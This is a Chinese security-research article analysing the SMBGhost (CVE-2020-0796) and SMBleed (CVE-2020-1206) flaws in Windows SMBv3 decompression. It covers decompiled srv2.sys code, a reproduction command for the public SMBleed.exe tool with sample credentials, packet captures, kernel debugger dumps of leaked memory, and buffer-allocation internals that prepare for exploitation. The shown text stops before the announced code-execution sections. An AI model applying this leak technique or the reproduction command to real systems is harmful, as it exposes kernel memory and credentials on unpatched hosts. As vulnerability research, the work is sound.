> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [paper.seebug.org](https://paper.seebug.org/1346/)

**作者：Strawberry @ QAX A-TEAM  
原文链接：[https://mp.weixin.qq.com/s/Xlfr8AIB43RuJ9lveqUGOA](https://mp.weixin.qq.com/s/Xlfr8AIB43RuJ9lveqUGOA)**

2020 年 3 月 11 日，微软发布了 115 个漏洞的补丁程序和一个安全指南（禁用 SMBv3 压缩指南 ---- ADV200005），ADV200005 中暴露了一个 SMBv3 的远程代码执行漏洞，该漏洞可能未经身份验证的攻击者在 SMB 服务器或客户端上远程执行代码，业内安全专家猜测该漏洞可能会造成蠕虫级传播。补丁日之后，微软又发布了 Windows SMBv3 客户端 / 服务器远程代码执行漏洞的安全更新细节和补丁程序，漏洞编号为 CVE-2020-0796，由于一些小插曲，该漏洞又被称为 SMBGhost。

2020 年 6 月 10 日，微软公开修复了 Microsoft Server Message Block 3.1.1 (SMBv3) 协议中的另一个信息泄露漏洞 CVE-2020-1206。该漏洞是由 ZecOps 安全研究人员在 SMBGhost 同一漏洞函数中发现的，又被称为 SMBleed。未经身份验证的攻击者可通过向目标 SMB 服务器发特制数据包来利用此漏洞，或配置一个恶意的 SMBv3 服务器并诱导用户连接来利用此漏洞。成功利用此漏洞的远程攻击者可获取敏感信息。

SMBGhost 和 SMBleed 漏洞产生于同一个函数，不同的是，SMBGhost 漏洞源于 OriginalCompressedSize 和 Offset 相加产生的整数溢出，SMBleed 漏洞在于 OriginalCompressedSize 或 Offset 欺骗产生的数据泄露。本文对以上漏洞进行分析总结，主要包括以下几个部分：

*   SMBGhost 漏洞回顾
*   SMBleed 漏洞复现分析
*   物理地址读 && SMBGhost 远程代码执行
*   SMBGhost && SMBleed 远程代码执行
*   Shellcode 调试分析

CVE-2020-0796 漏洞源于 Srv2DecompressData 函数，该函数主要负责将压缩过的 SMB 数据包还原（解压），但在使用 SrvNetAllocateBuffer 函数分配缓冲区时，传入了参数 OriginalCompressedSegmentSize + Offset，由于未对这两个值进行额外判断，存在整数溢出的可能。如果 SrvNetAllocateBuffer 函数使用较小的值作为第一个参数为 SMB 数据分配缓冲区，获取的缓冲区的长度或小于待解压数据解压后的数据的长度，这将导致程序在解压（SmbCompressionDecompress）的过程中产生缓冲区溢出。

```
NTSTATUS Srv2DecompressData(PCOMPRESSION_TRANSFORM_HEADER Header, SIZE_T TotalSize)
{
    PALLOCATION_HEADER Alloc = SrvNetAllocateBuffer(
        (ULONG)(Header->OriginalCompressedSegmentSize + Header->Offset),
        NULL);
    If (!Alloc) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    ULONG FinalCompressedSize = 0;

    NTSTATUS Status = SmbCompressionDecompress(
        Header->CompressionAlgorithm,
        (PUCHAR)Header + sizeof(COMPRESSION_TRANSFORM_HEADER) + Header->Offset,
        (ULONG)(TotalSize - sizeof(COMPRESSION_TRANSFORM_HEADER) - Header->Offset),
        (PUCHAR)Alloc->UserBuffer + Header->Offset,
        Header->OriginalCompressedSegmentSize,
        &FinalCompressedSize);
    if (Status < 0 || FinalCompressedSize != Header->OriginalCompressedSegmentSize) {
        SrvNetFreeBuffer(Alloc);
        return STATUS_BAD_DATA;
    }


    if (Header->Offset > 0) {
        memcpy(
            Alloc->UserBuffer,
            (PUCHAR)Header + sizeof(COMPRESSION_TRANSFORM_HEADER),
            Header->Offset);
    }


    Srv2ReplaceReceiveBuffer(some_session_handle, Alloc);
    return STATUS_SUCCESS;
}

```

通过 SrvNetAllocateBuffer 函数获取的缓冲区结构如下，函数返回的是 SRVNET_BUFFER_HDR 结构的指针，其偏移 0x18 处存放了 User Buffer 指针，User Buffer 区域用来存放还原的 SMB 数据，解压操作其实就是向 User Buffer 偏移 offset 处释放解压数据：

![](https://images.seebug.org/content/images/2020/09/24/1600927610000-1omvok.png-w331s)

原本程序设计的逻辑是，在解压成功之后调用 memcpy 函数将 raw data（压缩数据之前的 offset 大小的没有被压缩的数据）复制到 User Buffer 的起始处，解压后的数据是从 offset 偏移处开始存放的。正常的情况如下图所示，未压缩的数据后面跟着解压后的数据，复制的数据没有超过 User Buffer 的范围：

![](https://images.seebug.org/content/images/2020/09/24/1600927611000-2zoizu.png-w331s)

但由于整数溢出，分配的 User Buffer 空间会小，User Buffer 减 offset 剩下的空间不足以容纳解压后的数据，如下图所示。根据该结构的特点，可通过构造 Offset、Raw Data 和 Compressed Data，在解压时覆盖后面 SRVNET BUFFER HDR 结构体中的 UserBuffer 指针，从而在后续 memcpy 时向 UserBuffer（任意地址）写入可控的数据（任意数据）。**任意地址写是该漏洞利用的关键。**

![](https://images.seebug.org/content/images/2020/09/24/1600927612000-3xcxyd.png-w331s)

3 月份跟风分析过此漏洞并学习了通过任意地址写进行本地提权的利用方式，链接如下：[https://mp.weixin.qq.com/s/rKJdP_mZkaipQ9m0Qn9_2Q](https://mp.weixin.qq.com/s/rKJdP_mZkaipQ9m0Qn9_2Q)

根据 ZecOps 公开的信息可知，引发该漏洞的函数也是 srv2.sys 中的 Srv2DecompressData 函数，与 SMBGhost 漏洞（CVE-2020-0796）相同。

### 漏洞分析

再来回顾一下 Srv2DecompressData 函数吧，该函数用于还原（解压）SMB 数据。首先根据原始压缩数据中的 OriginalCompressedSegmentSize 和 Offset 计算出解压后结构的大小，然后通过 SrvNetAllocateBuffer 函数获取 SRVNET BUFFER HDR 结构（该结构中指明了可存放无需解压的 Offset 长度的数据和解压数据的缓冲区的 User Buffer），然后调用 SmbCompressionDecompress 函数向 User Buffer 的 Offset 偏移处写入数据。CVE-2020-0796 漏洞是由于 OriginalCompressedSegmentSize 和 Offset 相加的过程中出现整数溢出，从而导致获取的缓冲区不足以存放解压后的数据，最终在解压过程中产生溢出。

*   (ULONG)(Header->OriginalCompressedSegmentSize + Header->Offset) 处产生整数溢出，假设结果为 x
*   SrvNetAllocateBuffer 函数会根据 x 的大小去 LookAside 中寻找大小合适的缓冲区，并返回其后面的 SRVNET BUFFER HDR 结构，该结构偏移 0x18 处指向该缓冲区 User Buffer
*   SmbCompressionDecompress 函数依据指定的压缩算法将待解压数据解压到 User Buffer 偏移 Offset 处，但其实压缩前的数据长度大于剩余的缓冲区长度，解压复制的过程中产生缓冲区溢出

```
NTSTATUS Srv2DecompressData(PCOMPRESSION_TRANSFORM_HEADER Header, SIZE_T TotalSize)
{
    PALLOCATION_HEADER Alloc = SrvNetAllocateBuffer(
        (ULONG)(Header->OriginalCompressedSegmentSize + Header->Offset),
        NULL);
    If (!Alloc) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    ULONG FinalCompressedSize = 0;

    NTSTATUS Status = SmbCompressionDecompress(
        Header->CompressionAlgorithm,
        (PUCHAR)Header + sizeof(COMPRESSION_TRANSFORM_HEADER) + Header->Offset,
        (ULONG)(TotalSize - sizeof(COMPRESSION_TRANSFORM_HEADER) - Header->Offset),
        (PUCHAR)Alloc->UserBuffer + Header->Offset,
        Header->OriginalCompressedSegmentSize,
        &FinalCompressedSize);
    if (Status < 0 || FinalCompressedSize != Header->OriginalCompressedSegmentSize) {
        SrvNetFreeBuffer(Alloc);
        return STATUS_BAD_DATA;
    }


    if (Header->Offset > 0) {
        memcpy(
            Alloc->UserBuffer,
            (PUCHAR)Header + sizeof(COMPRESSION_TRANSFORM_HEADER),
            Header->Offset);
    }


    Srv2ReplaceReceiveBuffer(some_session_handle, Alloc);
    return STATUS_SUCCESS;
}

```

在 SmbCompressionDecompress 函数中有一个神操作，如下所示，如果 nt!RtlDecompressBufferEx2 返回值非负（解压成功），则将 FinalCompressedSize 赋值为 OriginalCompressedSegmentSize。因而，只要数据解压成功，就不会进入 SrvNetFreeBuffer 等流程，即使解压操作后会判断 FinalCompressedSize 和 OriginalCompressedSegmentSize 是否相等。这是 0796 任意地址写的前提条件。

```
  if ( (int)RtlGetCompressionWorkSpaceSize(v13, &NumberOfBytes, &v18) < 0
    || (v6 = ExAllocatePoolWithTag((POOL_TYPE)512, (unsigned int)NumberOfBytes, 0x2532534Cu)) != 0i64 )
  {
    v14 = &FinalCompressedSize;
    v17 = v8;
    v15 = OriginalCompressedSegmentSize;
    v10 = RtlDecompressBufferEx2(v13, v7, OriginalCompressedSegmentSize, v9, v17, 4096, FinalCompressedSize, v6, v18);
    if ( v10 >= 0 )
      *v14 = v15;
    if ( v6 )
      ExFreePoolWithTag(v6, 0x2532534Cu);
  }

```

这也是 CVE-2020-1206 的漏洞成因之一，SmbCompressionDecompress 函数会对 FinalCompressedSize 值进行更新，导致实际解压出来的数据长度和 OriginalCompressedSegmentSize 不相等时也不会进入释放流程。而且在解压成功之后会将 SRVNET BUFFER HDR 结构中的 UserBufferSizeUsed 赋值为 Offset 与 FinalCompressedSize 之和，这个操作也是挺重要的。

```
//Srv2DecompressData

    if (Status < 0 || FinalCompressedSize != Header->OriginalCompressedSegmentSize) {
        SrvNetFreeBuffer(Alloc);
        return STATUS_BAD_DATA;
    }

    if (Header->Offset > 0) {
        memcpy(
            Alloc->UserBuffer,
            (PUCHAR)Header + sizeof(COMPRESSION_TRANSFORM_HEADER),
            Header->Offset);
    }

    Alloc->UserBufferSizeUsed = Header->Offset + FinalCompressedSize;

    Srv2ReplaceReceiveBuffer(some_session_handle, Alloc);
    return STATUS_SUCCESS;
}

```

那如果我们将 OriginalCompressedSegmentSize 设置为比实际压缩的数据长度大的数，让系统认为解压后的数据长度就是 OriginalCompressedSegmentSize 大小，是不是也可以泄露内存中的数据（类似于心脏滴血）。如下所示，POC 中将 OriginalCompressedSegmentSize 设置为 x + 0x1000，offset 设置为 0，最终得到解压后的数据 (长度为 x)，其后面跟有未初始化的内核数据 ，然后利用解压后的 SMB2 WRITE 消息泄露后面紧跟着的长度为 0x1000 的未初始化数据。

![](https://images.seebug.org/content/images/2020/09/24/1600927612000-4qgtyb.png-w331s)

### 漏洞复现

在 Win10 1903 下使用公开的 SMBleed.exe 进行测试（需要身份认证和可写权限）。步骤如下： _共享 C 盘，确保允许 Everyone 进行更改（或添加其他用户并赋予其读取和更改权限）_ 在 C 盘下创建 share 目录，以便对文件写入和读取 * 按照提示运行 SMBleed.exe 程序，例：SMBleed.exe win10 127.0.0.1 DESKTOP-C2C92C6 strawberry 123123 c share\test.bin local.bin

以下为获得的 local.bin 中的部分信息：![](https://images.seebug.org/content/images/2020/09/24/1600927613000-5ahphj.png-w331s)

### 抓包分析

在复现的同时可以抓包，可以发现协商之后的大部分包都采用了 SMB 压缩（ProtocalId 为 0x424D53FC）。根据数据包可判断 POC 流程大概是这样的：SMB 协商 -> 用户认证 -> 创建文件 -> 利用漏洞泄露内存信息并写入文件 -> 将文件读取到本地 -> 结束连接。

注意到一个来自服务端的 Write Response 数据包，其 status 为 STATUS_SUCCESS，说明写入操作成功。ZecOps 在文章中提到过他们利用 [SMB2 WRITE 消息](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/e7046961-3318-4350-be2a-a8d69bb59ce8)来演示此漏洞，因而我们需要关注一下其对应的请求包，也就是下图中 id 为 43 的那个数据包。

![](https://images.seebug.org/content/images/2020/09/24/1600927613000-6pxmog.png-w331s)

下面为触发漏洞的 SMB 压缩请求包，粉色方框里的 OriginalCompressedSegmentSize 字段值为 0x1070，但实际压缩前的数据只有 0x70，可借助 SMB2 WRITE 将未初始化的内存泄露出来。

![](https://images.seebug.org/content/images/2020/09/24/1600927614000-7iaalj.png-w331s)

以下为解压前后数据对比，解压前数据大小为 0x3f，解压后数据大小为 0x70（真实解压大小，后面为未初始化内存），解压后的数据包括 SMB2 数据包头（0x40 长度）和偏移 0x40 处的 SMB2 WRITE 结构。在这 SMB2 WRITE 结构中指明了向目标文件写入后面未初始化的 0x1000 长度的数据。

```
3: kd> 
srv2!Srv2DecompressData+0xdc:
fffff800`01e17f3c e86f657705      call    srvnet!SmbCompressionDecompress (fffff800`0758e4b0)
3: kd> dd rdx   //压缩数据
ffffb283`210dfdf0  02460cc0 424d53fe 00030040 004d0009
ffffb283`210dfe00  18050000 ff000100 010000fe 00190038
ffffb283`210dfe10  0018f800 31150007 00007000 ffffff10
ffffb283`210dfe20  070040df 00183e00 00390179 00060007
ffffb283`210dfe30  00000000 00000000 00000000 00000000
ffffb283`210dfe40  00000000 00000000 00000000 00000000
ffffb283`210dfe50  00000000 00000000 00000000 00000000
ffffb283`210dfe60  00000000 00000000 00000000 00000000

3: kd> db ffffb283`1fe23050 l1070  //解压后数据
ffffb283`1fe23050  fe 53 4d 42 40 00 00 00-00 00 00 00 09 00 40 00  .SMB@.........@.
ffffb283`1fe23060  00 00 00 00 00 00 00 00-05 00 00 00 00 00 00 00  ................
ffffb283`1fe23070  ff fe 00 00 01 00 00 00-01 00 00 00 00 f8 00 00  ................
ffffb283`1fe23080  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffb283`1fe23090  31 00 70 00 00 10 00 00-00 00 00 00 00 00 00 00  1.p.............
ffffb283`1fe230a0  00 00 00 00 3e 00 00 00-01 00 00 00 3e 00 00 00  ....>.......>...
ffffb283`1fe230b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffb283`1fe230c0  4d 53 53 50 00 03 00 00-00 18 00 18 00 a8 00 00  MSSP............
ffffb283`1fe230d0  00 1c 01 1c 01 c0 00 00-00 1e 00 1e 00 58 00 00  .............X..
ffffb283`1fe230e0  00 14 00 14 00 76 00 00-00 1e 00 1e 00 8a 00 00  .....v..........
ffffb283`1fe230f0  00 10 00 10 00 dc 01 00-00 15 82 88 e2 0a 00 ba  ................
ffffb283`1fe23100  47 00 00 00 0f 42 75 7d-f2 d2 46 fe 0f 4b 14 e0  G....Bu}..F..K..
ffffb283`1fe23110  c5 8f fc cd 0a 44 00 45-00 53 00 4b 00 54 00 4f  .....D.E.S.K.T.O
ffffb283`1fe23120  00 50 00 2d 00 43 00 32-00 43 00 39 00 32 00 43  .P.-.C.2.C.9.2.C
ffffb283`1fe23130  00 36 00 73 00 74 00 72-00 61 00 77 00 62 00 65  .6.s.t.r.a.w.b.e
ffffb283`1fe23140  00 72 00 72 00 79 00 44-00 45 00 53 00 4b 00 54  .r.r.y.D.E.S.K.T
ffffb283`1fe23150  00 4f 00 50 00 2d 00 43-00 32 00 43 00 39 00 32  .O.P.-.C.2.C.9.2
ffffb283`1fe23160  00 43 00 36 00 00 00 00-00 00 00 00 00 00 00 00  .C.6............
ffffb283`1fe23170  00 00 00 00 00 00 00 00-00 00 00 00 00 21 52 f2  .............!R.
ffffb283`1fe23180  53 be ee d2 a8 01 46 1d-69 9c 78 f5 90 01 01 00  S.....F.i.x.....
ffffb283`1fe23190  00 00 00 00 00 43 c5 71-42 a7 43 d6 01 d9 a8 02  .....C.qB.C.....
ffffb283`1fe231a0  16 83 a3 24 75 00 00 00-00 02 00 1e 00 44 00 45  ...$u........D.E
ffffb283`1fe231b0  00 53 00 4b 00 54 00 4f-00 50 00 2d 00 43 00 32  .S.K.T.O.P.-.C.2
ffffb283`1fe231c0  00 43 00 39 00 32 00 43-00 36 00 01 00 1e 00 44  .C.9.2.C.6.....D
ffffb283`1fe231d0  00 45 00 53 00 4b 00 54-00 4f 00 50 00 2d 00 43  .E.S.K.T.O.P.-.C
ffffb283`1fe231e0  00 32 00 43 00 39 00 32-00 43 00 36 00 04 00 1e  .2.C.9.2.C.6....
ffffb283`1fe231f0  00 44 00 45 00 53 00 4b-00 54 00 4f 00 50 00 2d  .D.E.S.K.T.O.P.-
ffffb283`1fe23200  00 43 00 32 00 43 00 39-00 32 00 43 00 36 00 03  .C.2.C.9.2.C.6..
ffffb283`1fe23210  00 1e 00 44 00 45 00 53-00 4b 00 54 00 4f 00 50  ...D.E.S.K.T.O.P
ffffb283`1fe23220  00 2d 00 43 00 32 00 43-00 39 00 32 00 43 00 36  .-.C.2.C.9.2.C.6
ffffb283`1fe23230  00 07 00 08 00 43 c5 71-42 a7 43 d6 01 06 00 04  .....C.qB.C.....
ffffb283`1fe23240  00 02 00 00 00 08 00 30-00 30 00 00 00 00 00 00  .......0.0......
ffffb283`1fe23250  00 01 00 00 00 00 20 00-00 6f 26 f2 a8 d5 ab cf  ...... ..o&.....
ffffb283`1fe23260  14 7d a9 e2 e9 5a 37 0e-94 56 6d 23 d4 42 bf ba  .}...Z7..Vm#.B..
ffffb283`1fe23270  1c 3d 9b 38 91 d3 b4 0f-cd 0a 00 10 00 00 00 00  .=.8............
ffffb283`1fe23280  00 00 00 00 00 00 00 00-00 00 00 00 00 09 00 00  ................
ffffb283`1fe23290  00 00 00 00 00 00 00 00-00 1e a8 6f 1d 2e 86 e2  ...........o....
ffffb283`1fe232a0  6b b9 6b 8b e6 21 f6 de-7f a3 12 04 10 01 00 00  k.k..!..........
ffffb283`1fe232b0  00 9d 20 ee a2 a7 b3 6e-67 00 00 00 00 00 00 00  .. ....ng.......

```

SMB2 WRITE 部分结构如下（了解这些就够了吧）： _**StructureSize（2 个字节）：**客户端必须将此字段设置为 49（0x31），表示请求结构的大小，不包括 SMB 头部。_ **DataOffset（2 个字节）：**指明要写入的数据相对于 SMB 头部的偏移量（以字节为单位）。 _**长度（4 个字节）：**要写入的数据的长度，以字节为单位。要写入的数据长度可以为 0。_ **偏移量（8 个字节）：**将数据写入目标文件的位置的偏移量（以字节为**单位）**。如果在管道上执行写操作，则客户端必须将其设置为 0，服务器必须忽略该字段。 * **FILEID（16 个字节）：**[SMB2_FILEID](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/f1d9b40d-e335-45fc-9d0b-199a31ede4c3) 文件句柄。 ……

所以根据以上信息可知，DataOffset 为 0x70，数据长度为 0x1000，从文件偏移 0 的位置开始写入。查看本次泄露的数据，可以发现正好就是 SMB 头偏移 0x70 处的 0x1000 长度的数据。

![](https://images.seebug.org/content/images/2020/09/24/1600927618000-8yncfb.png-w331s)

所以，前面的 UserBufferSizeUsed 起了什么样的作用呢？在 Srv2PlainTextReceiveHandler 函数中会将其复制到 v3 偏移 0x154 处。然后在 Smb2ExecuteWriteReal 函数（Smb2ExecuteWrite 函数调用）中会判断之前复制的那个双字节值是否小于 SMB2 WRITE 结构中的 DataOffset 和长度之和，如果小于的话就会出错（不能写入数据）。POC 中将这两个字段分别设置为 0x70 和 0x1000，相加后正好等于 0x1070，如果将长度字段设置的稍小一些，那么相应的，泄露的数据长度也会变小。也就是说，OriginalCompressedSegmentSize 字段设置了泄露的上限（OriginalCompressedSegmentSize - DataOffset），具体泄露的数据长度还是要看 SMB2 WRITE 结构中的长度。在这里不得不佩服作者的脑洞，但这种思路需要目标系统共享文件夹以及获取权限，还是有些局限的。

```
//Srv2PlainTextReceiveHandler
  v2 = a2;
  v3 = a1;
  v4 = Smb2ValidateMessageIdAndCommand(
         a1,
         *(_QWORD *)(*(_QWORD *)(a1 + 0xF0) + 0x18i64),    //UserBuffer
         *(_DWORD *)(*(_QWORD *)(a1 + 0xF0) + 0x24i64));   //UserBufferSizeUsed
  if ( (v4 & 0x80000000) == 0 )
  {
    v6 = *(_QWORD *)(v3 + 0xF0);
    *(_DWORD *)(v3 + 0x158) = *(_DWORD *)(v6 + 0x24);
    v7 = Srv2CheckMessageSize(*(_DWORD *)(v6 + 0x24), *(_DWORD *)(v6 + 0x24), *(_QWORD *)(v6 + 0x18));    //UserBufferSizeUsed or *(int *)(UserBuffer+0x14)
    v9 = v7;
    if ( v7 == (_DWORD)v8 || (result = Srv2PlainTextCompoundReceiveHandler(v3, v7), (int)result >= 0) )
    {
      *(_DWORD *)(v3 + 0x150) = v9;
      *(_DWORD *)(v3 + 0x154) = v9;    //上层结构，没有好好分析
      *(_BYTE *)(v3 + 0x198) = 1;

//Smb2ExecuteWriteReal
3: kd> g
Breakpoint 5 hit
srv2!Smb2ExecuteWriteReal+0xc9:
fffff800`01e4f949 0f82e94f0100    jb      srv2!Smb2ExecuteWriteReal+0x150b8 (fffff800`01e64938)
3: kd> ub rip
srv2!Smb2ExecuteWriteReal+0xa5:
fffff800`01e4f925 85c0            test    eax,eax
fffff800`01e4f927 0f88b94f0100    js      srv2!Smb2ExecuteWriteReal+0x15066 (fffff800`01e648e6)
fffff800`01e4f92d 4c39bbb8000000  cmp     qword ptr [rbx+0B8h],r15
fffff800`01e4f934 0f85d34f0100    jne     srv2!Smb2ExecuteWriteReal+0x1508d (fffff800`01e6490d)
fffff800`01e4f93a 0fb74f42        movzx   ecx,word ptr [rdi+42h]
fffff800`01e4f93e 8bc1            mov     eax,ecx
fffff800`01e4f940 034744          add     eax,dword ptr [rdi+44h]
fffff800`01e4f943 398654010000    cmp     dword ptr [rsi+154h],eax

3: kd> dd rdi
ffffb283`1fe25050  424d53fe 00000040 00000000 00400009
ffffb283`1fe25060  00000000 00000000 00000005 00000000
ffffb283`1fe25070  0000feff 00000001 00000001 0000f800
ffffb283`1fe25080  00000000 00000000 00000000 00000000
ffffb283`1fe25090  00700031 00001000 00000000 00000000
ffffb283`1fe250a0  00000000 0000003e 00000001 0000003e
ffffb283`1fe250b0  00000000 00000000 00000000 00000000
ffffb283`1fe250c0  00000000 00000000 00000020 00000000

```

在进行复现前，对一些结构进行分析，如 Lookaside、SRVNET BUFFER HDR、MDL 等等，以便更好地理解这种利用方式。

### Lookaside 初始化

SrvNetAllocateBuffer 函数会从 SrvNetBufferLookasides 表中获取大小合适的缓冲区，如下所示，SrvNetAllocateBuffer 第一个参数为数据的长度，这里为还原的数据的长度（解压 + 无需解压的数据），第二个参数为 SRVNET_BUFFER_HDR 结构体指针或 0。如果传入的长度在 [0x1100 , 0x100100] 区间，会进入以下流程。

```
//SrvNetAllocateBuffer(unsigned __int64 a1, __int64 a2)
//a1: OriginalCompressedSegmentSize + Offset
//a2: 0

v3 = 0;
......
  else
  {
    if ( a1 > 0x1100 )                          // 这里这里
    {
      v13 = a1 - 0x100;
      _BitScanReverse64((unsigned __int64 *)&v14, v13);// 从高到低扫描，找到第一个1，v14存放比特位
      _BitScanForward64((unsigned __int64 *)&v15, v13);// 从低到高扫描，找到第一个1，v15存放比特位
      if ( (_DWORD)v14 == (_DWORD)v15 )         // 说明只有一个1
        v3 = v14 - 0xC; 
      else
        v3 = v14 - 0xB;
    }
    v6 = SrvNetBufferLookasides[v3];

```

上述代码的逻辑为，分别找到 length - 0x100 中 1 的最高比特位和最低比特位，如果相等的话，用最高比特位索引减 0xC，否则用最高比特位索引减 0xB。最高比特位 x 可确定长度的大致范围 [1<>i) + 0x100 的值，也就是 length，第三行为 i - 0xc，表示 SrvNetBufferLookasides 中相应的索引。

<table><thead><tr><th>比特位</th><th>12</th><th>13</th><th>14</th><th>15</th><th>16</th><th>17</th><th>18</th><th>19</th><th>20</th></tr></thead><tbody><tr><td>长度</td><td>0x1100</td><td>0x2100</td><td>0x4100</td><td>0x8100</td><td>0x10100</td><td>0x20100</td><td>0x40100</td><td>0x80100</td><td>0x100100</td></tr><tr><td>索引</td><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td><td>8</td></tr></tbody></table>

后面的流程为根据索引从 SrvNetBufferLookasides 中取出相应结构体 X 的指针，取其第一项（核心数加 1 的值），v2 为 KPCR 结构偏移 0x1A4 处的核心号。然后从结构体 X 偏移 0x20 处获取结构 v9，v7（v8）表示当前核心要处理的数据在 v9 结构体中的索引（核心号加 1），然后通过 v8 索引获取结构 v10，综上：v10 = _(_QWORD_ )(_(_QWORD_ )（SrvNetBufferLookasides[index] + 0x20）+ 8*（Core number + 1）），如果 v10 偏移 0x70 处不为 0（表示结构已分配），就取出 v10 偏移 8 处的结构（SRVNET_BUFFER_HDR）。如果没分配，就调用 PplpLazyInitializeLookasideList 函数。

```
 v2 = __readgsdword(0x1A4u);
 ......
    v6 = SrvNetBufferLookasides[v3];
    v7 = *(_DWORD *)v6 - 1;
    if ( (unsigned int)v2 + 1 < *(_DWORD *)v6 )
      v7 = v2 + 1;
    v8 = v7;
    v9 = *(_QWORD *)(v6 + 0x20);
    v10 = *(_QWORD *)(v9 + 8 * v8);
    if ( !*(_BYTE *)(v10 + 0x70) )
      PplpLazyInitializeLookasideList(v6, *(_QWORD *)(v9 + 8 * v8));
    ++*(_DWORD *)(v10 + 0x14);
    v11 = (SRVNET_BUFFER_HDR *)ExpInterlockedPopEntrySList((PSLIST_HEADER)v10);

```

举个例子（单核系统），假设需要的缓冲区长度为 0x10101（需要 0x20100 大小的缓冲区来存放），得到 SrvNetBufferLookasides 表中的索引为 5，最终通过一步一步索引得到缓冲区 0xffffcc0f775f0150（熟悉的 SRVNET_BUFFER_HDR 结构）：

```
kd> 
srvnet!SrvNetAllocateBuffer+0x5d:
fffff806`2280679d 440fb7c5        movzx   r8d,bp

//SrvNetBufferLookasides表  大小0x48 索引0-8
kd> dq rcx   
fffff806`228350f0  ffffcc0f`7623dd00 ffffcc0f`7623d480
fffff806`22835100  ffffcc0f`7623dc40 ffffcc0f`7623d100
fffff806`22835110  ffffcc0f`7623dd80 ffffcc0f`7623d640
fffff806`22835120  ffffcc0f`7623db40 ffffcc0f`7623dbc0
fffff806`22835130  ffffcc0f`7623de00 

//SrvNetBufferLookasides[5]  单核系统核心数1再加1为2（第一项）
kd> dq ffffcc0f`7623d640
ffffcc0f`7623d640  00000000`00000002 6662534c`3030534c
ffffcc0f`7623d650  00000000`00020100 00000000`00000200
ffffcc0f`7623d660  ffffcc0f`762356c0 00000000`00000000
ffffcc0f`7623d670  00000000`00000000 00000000`00000000

//上面的结构偏移0x20
kd> dq ffffcc0f`762356c0
ffffcc0f`762356c0  ffffcc0f`75191ec0 ffffcc0f`75192980

//上面的结构偏移8      v8 = v7 = 2 - 1 = 1
kd> dq ffffcc0f`75192980
ffffcc0f`75192980  00000000`00090001 ffffcc0f`775f0150
ffffcc0f`75192990  00000009`01000004 00000009`00000001
ffffcc0f`751929a0  00000200`00000000 00020100`3030534c
ffffcc0f`751929b0  fffff806`2280d600 fffff806`2280d590
ffffcc0f`751929c0  ffffcc0f`76047cb0 ffffcc0f`75190780
ffffcc0f`751929d0  00000001`00000009 00000000`00000000
ffffcc0f`751929e0  ffffcc0f`75191ec0 00000000`00000000
ffffcc0f`751929f0  00000000`00000001 00000000`00000000

//ExpInterlockedPopEntrySList弹出偏移8处的0xffffcc0f775f0150，还是熟悉的味道（SRVNET_BUFFER_HDR）
kd> dd ffffcc0f`775f0150
ffffcc0f`775f0150  00000000 00000000 72f39558 ffffcc0f
ffffcc0f`775f0160  00050000 00000000 775d0050 ffffcc0f
ffffcc0f`775f0170  00020100 00000000 00020468 00000000
ffffcc0f`775f0180  775d0000 ffffcc0f 775f01e0 ffffcc0f
ffffcc0f`775f0190  00000000 6f726274 00000000 00000000
ffffcc0f`775f01a0  775f0320 ffffcc0f 00000000 00000000
ffffcc0f`775f01b0  00000000 00000001 63736544 74706972
ffffcc0f`775f01c0  006e6f69 00000000 ffffffd8 00610043

```

SrvNetBufferLookasides 是由自定义的 SrvNetCreateBufferLookasides 函数初始化的。如下所示，这里其实就是以 1 <<(index + 0xC)) + 0x100 为长度（0 <= index < 9），然后调用 PplCreateLookasideList 设置上面介绍的那些结构。在 PplCreateLookasideList 函数中设置上面第二三个结构，在 PplpCreateOneLookasideList 函数中设置上面第四个结构，最终在 SrvNetAllocateBufferFromPool 函数（SrvNetBufferLookasideAllocate 函数调用）中设置 SRVNET_BUFFER_HDR 结构。

```
//SrvNetCreateBufferLookasides
  while ( 1 )
  {
    v4 = PplCreateLookasideList(
           (__int64 (__fastcall *)())SrvNetBufferLookasideAllocate,
           (__int64 (__fastcall *)(PSLIST_ENTRY))SrvNetBufferLookasideFree,
           v1,                                  // 0
           v2,                                  // 0
           (1 << (v3 + 0xC)) + 0x100,
           0x3030534C,
           v6,
           0x6662534Cu);
    *v0 = v4;
    if ( !v4 )
      break;
    ++v3;
    ++v0;
    if ( v3 >= 9 )
      return 0i64;
  }

```

以下为对 SRVNET_BUFFER_HDR 结构的初始化过程，v7 为 length（满足 (1 << (index + 0xC)) + 0x100 条件）+ 0xE8（SRVNET_BUFFER_HDR 结构长度 + 8+0x50）+ 2 * (MDL + 8)，其中 MDL 结构大小和 length+0xE8 相关，后面会介绍。然后通过 ExAllocatePoolWithTag 函数分配 v7 大小的内存，根据偏移获取 UserBufferPtr（偏移 0x50）、SRVNET_BUFFER_HDR（偏移 0x50 加 length，8 字节对齐）等地址，具体如下，不一一介绍。

```
//SrvNetAllocateBufferFromPool
  v8 = (BYTE *)ExAllocatePoolWithTag((POOL_TYPE)0x200, v7, 0x3030534Cu);
  ......
  v11 = (__int64)(v8 + 0x50);
  v12 = (SRVNET_BUFFER_HDR *)((unsigned __int64)&v8[v2 + 0x57] & 0xFFFFFFFFFFFFFFF8ui64);    //v2是length
  v12->PoolAllocationPtr = v8;
  v12->pMdl2 = (PMDL)((unsigned __int64)&v12->unknown3[v5 + 0xF] & 0xFFFFFFFFFFFFFFF8ui64);
  v13 = (_MDL *)((unsigned __int64)&v12->unknown3[0xF] & 0xFFFFFFFFFFFFFFF8ui64);
  v12->UserBufferPtr = v8 + 0x50;
  v12->pMdl1 = v13;
  v12->BufferFlags = 0;
  v12->TracingDataCount = 0;
  v12->UserBufferSizeAllocated = v2;
  v12->UserBufferSizeUsed = 0;
  v14 = ((_WORD)v8 + 0x50) & 0xFFF;
  v12->PoolAllocationSize = v7;
  v12->BytesProcessed = 0;
  v12->BytesReceived = 0i64;
  v12->pSrvNetWskStruct = 0i64;
  v12->SmbFlags = 0;

//SRVNET_BUFFER_HDR 例：
kd> dq rdi
ffffcc0f`76fed150  00000000`00000000 00000000`00000000
ffffcc0f`76fed160  00000000`00000000 ffffcc0f`76fe9050
ffffcc0f`76fed170  00000000`00004100 00000000`000042a8
